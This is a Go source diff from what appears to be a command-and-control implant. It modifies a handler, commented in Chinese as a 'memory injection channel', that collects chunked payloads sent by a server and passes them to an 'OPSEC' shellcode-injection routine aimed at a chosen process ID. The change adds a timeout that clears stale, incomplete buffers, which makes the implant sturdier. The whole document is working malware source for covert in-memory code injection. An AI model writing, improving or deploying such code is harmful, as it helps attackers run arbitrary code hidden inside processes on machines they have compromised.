@@ -8,6 +8,7 @@ import (
 	"errors"
 	"fmt"
 	"sync"
+	"time"
 )
 
 // ===== A9: 内存注入通道 =====
@@ -18,16 +19,19 @@ import (
 // 全量收齐后拼接 → InjectShellcode（OPSEC 注入链）→ 立即释放缓冲。
 
 const (
-	injectMemMaxTotal   = 32 * 1024 * 1024 // 载荷上限 32MB（防内存滥用）
+	injectMemMaxTotal   = 32 * 1024 * 1024  // 载荷上限 32MB（防内存滥用）
 	injectMemMinPayload = 4 + 4 + 4 + 4 + 4 // requestId+total+seq+pidLen+techLen
+	// injectMemStaleTimeout 未收齐的分块缓冲保留时长：服务端中途放弃时不再永久占内存。
+	injectMemStaleTimeout = 10 * time.Minute
 )
 
 type injectMemBuffer struct {
-	pid    int
-	tech   string
-	total  uint32
-	buf    []byte
-	lastSeq uint32 // 已接收的最大 seq+1（顺序接收校验）
+	pid      int
+	tech     string
+	total    uint32
+	buf      []byte
+	lastSeq  uint32 // 已接收的最大 seq+1（顺序接收校验）
+	lastSeen time.Time
 }
 
 var (
@@ -35,8 +39,20 @@ var (
 	injectMemTable = make(map[uint32]*injectMemBuffer)
 )
 
+// sweepStaleInjectMem 清理长时间未收齐的分块缓冲（服务端放弃/网络中断）。
+func sweepStaleInjectMem(now time.Time) {
+	injectMemMu.Lock()
+	for id, ib := range injectMemTable {
+		if !ib.lastSeen.IsZero() && now.Sub(ib.lastSeen) > injectMemStaleTimeout {
+			delete(injectMemTable, id)
+		}
+	}
+	injectMemMu.Unlock()
+}
+
 // CmdInjectMem 处理一个分块包；全量收齐后执行注入并返回结果
 func CmdInjectMem(cmdBuf []byte) ([]byte, error) {
+	sweepStaleInjectMem(time.Now())
 	b := bytes.NewBuffer(cmdBuf)
 	if b.Len() < injectMemMinPayload {
 		return nil, errors.New("内存注入包过短")
@@ -91,9 +107,10 @@ func CmdInjectMem(cmdBuf []byte) ([]byte, error) {
 			injectMemMu.Unlock()
 			return nil, errors.New("内存注入首包缺少 PID")
 		}
-		ib = &injectMemBuffer{pid: pid, tech: tech, total: total, buf: make([]byte, 0, total)}
+		ib = &injectMemBuffer{pid: pid, tech: tech, total: total, buf: make([]byte, 0, total), lastSeen: time.Now()}
 		injectMemTable[requestId] = ib
 	}
+	ib.lastSeen = time.Now()
 	if seq != ib.lastSeq {
 		injectMemMu.Unlock()
 		return nil, fmt.Errorf("内存注入分块乱序: 期望 %d, 实际 %d", ib.lastSeq, seq)
